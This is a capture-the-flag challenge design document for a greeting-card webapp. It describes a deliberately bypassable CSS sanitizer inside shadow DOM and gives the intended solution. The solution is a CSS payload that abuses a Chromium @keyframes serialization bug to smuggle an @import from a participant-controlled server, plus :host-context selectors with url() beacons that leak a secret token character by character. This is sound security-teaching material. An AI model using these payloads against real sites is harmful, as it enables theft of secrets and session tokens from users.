# In the shadows

## Overview

The challenge is a very small webapp to create online greetings cards.

## The goal

The goal of the challenge is to bypass a CSS sanitizer to exfiltrate a token stored in an attribute of the `<body>` tag. The token is expected to be at least 96-hexadecimal-digits long. An example of a token to steal is:

```html
<body
  secret="088787d8ff144c502c7f5cffaafe2cc588d86079f9de88304c26b0cb99ce91c65d22c93dc161a03cefb7b3718164b208"
></body>
```

The token will be randomly generated on every page load requiring the participants to exfiltrate it in one go.

## Token format

The expected format of the token is (in pseudo-Python’s notation):

```python
first_part = ("1" if user_is_admin else "0") + random_hex(31)
timestamp = current_time + timedelta(minutes=5)
payload = first_part + timestamp
sig = hmacsha256(payload)
token = payload + sig
```

Thanks to HMAC, we won’t have to store valid tokens; we’ll be able to tell if the token is valid, and if the token belongs to an admin user. The first digit of will be “1” only if run by the XSS bot.

## Implementation

Here’s the overview of the implementation of the sanitization:

1. The app defines a custom element called `sanitized-content` whose shadow DOM contains HTML sanitized by DOMPurify with a custom sanitizer for style elements.

1. Shadow DOM by design provides an encapsulation of CSS, i.e. it’s not normally possible (bar certain special CSS functions) to use CSS selectors on the content outside of the shadow DOM.

1. DOMPurify is configured to limit the possibility of an unintended solution using XSS:
   - Only HTML namespace allowed,
   - Returns DocumentFragment instead of a string (no mutation XSS risk),
   - Certain funky tags are disallowed (such as noscript, template, xmp etc.).
1. The custom CSS sanitizer works the following way:
   - It immediately disallows the CSS if it contains `@import` statement or `url(` function.
   - It parses the CSS to CSSOM (CSS Object Model).
   - It iterates over all rules of the CSS and accepts only a handful of them (for instance: disallows `@media`, `@page` or `@namespace` rules but allows `@keyframes` or `@counter-style` rules).
   - In selectors, it disallows selectors containing the character `:`.
   - It serializes the CSS and checks again whether there is any `@import` or `url(`. If there is, the CSS is discarded.
   - Otherwise the CSS is returned.
1. To further limit the risk of unintended solutions using XSS, a nonce-based CSP for scripts is used.

`sanitized-content` will be used on both HTML preview and the share URL.

## The challenge

In order to solve the challenge, the participants will have to solve the following problems:

1. The shadow DOM provides a natural encapsulation layer for CSS. The participants need to find that there exist only a handful of functions which allow breaking the encapsulation (although still in a limited way), such as: `:host` or `:host-context`.
1. The token is very long and cannot be realistically exfiltrated in a single stylesheet. Therefore it is required to use `@import` and use tricks to exfiltrate the whole token with a single injection point (tricks from my old blog post can be used here).
1. The CSS sanitizer parses the CSS and explicitly disallows `@import`. The only way to inject your own CSS is to abuse a bug in Chromium in CSS serialization in certain at-rules such as @keyframes.
1. `@import` is allowed in CSS only if it appears before other at-rules and qualified rules. Therefore, to make the exploit work, the participants must make sure that anything before `@import` is syntactically invalid so that `@import` is the first valid statement in the stylesheet.

## XSS bot

In the share feature, there will be a button to share it also with the admin. This will run an XSS bot that’ll visit the page. The app itself will distinguish admin from ordinary users by a cookie value.

There is nothing unusual to implement in the XSS bot.

## Intended solution

Here’s (more or less) the intended solution for this challenge:

### The stylesheet

```css
@keyframes a\ b\;\@\\import\'https\:\/\/participants-server.com\'\; {
}
```

Because of a Chromium bug, after re-serialization, the stylesheet will have the following form:

```css
@keyframes a b;@\import'https://participants-server.com';{}
```

The initial `@keyframes` has two values which is incorrect per CSS spec and the declaration will be ignored by the parsed. Therefore `@import` becomes the first statement which is valid. The additional slash (in `@\import`) is to ensure that step e of the sanitizer, described above, won’t block the stylesheet.

### The imported stylesheet

```css
:host-context(body[secret^="a"]) {
  background: url("https://participants-server.com/a");
}
:host-context(body[secret^="b"]) {
  background: url("https://participants-server.com/b");
}
/* .... */
```

The core idea is to use `:host-context` to break the encapsulation of the shadow DOM and steal the token char-by-char. While not shown in this readme, tricks from [CSS data exfiltration in Firefox via a single injection point](https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/) can be used to exfiltrate the token in one go.
